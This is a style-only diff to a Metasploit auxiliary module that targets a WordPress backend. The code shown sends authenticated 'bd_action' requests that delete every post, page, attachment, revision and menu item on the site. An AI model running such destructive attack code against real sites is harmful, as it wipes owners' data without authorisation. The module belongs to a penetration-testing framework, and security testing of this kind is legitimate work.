@@ -44,11 +44,11 @@ class Metasploit3 < Msf::Auxiliary
 
   def do_action(action, data)
     res = send_request_cgi(
-        'method'    => 'POST',
-        'uri'       => normalize_uri(wordpress_url_backend, 'index.php'),
-        'vars_get'  => { bd_action: action },
+        'method' => 'POST',
+        'uri' => normalize_uri(wordpress_url_backend, 'index.php'),
+        'vars_get' => {bd_action: action},
         'vars_post' => data,
-        'cookie'    => @cookie
+        'cookie' => @cookie
     )
 
     if res.nil?
@@ -92,7 +92,7 @@ class Metasploit3 < Msf::Auxiliary
     %w(post page attachment revision nav_menu_item).each { |a|
       vprint_status("Deleting all posts from post type #{a}")
 
-      r = do_action('delete_posts_by_post_type', { 'smbd_types[0]' => "#{a}"} )
+      r = do_action('delete_posts_by_post_type', {'smbd_types[0]' => "#{a}"})
 
       if r.nil? or r.code != 200
         vprint_error("Failed to delete all posts from post type #{a}")
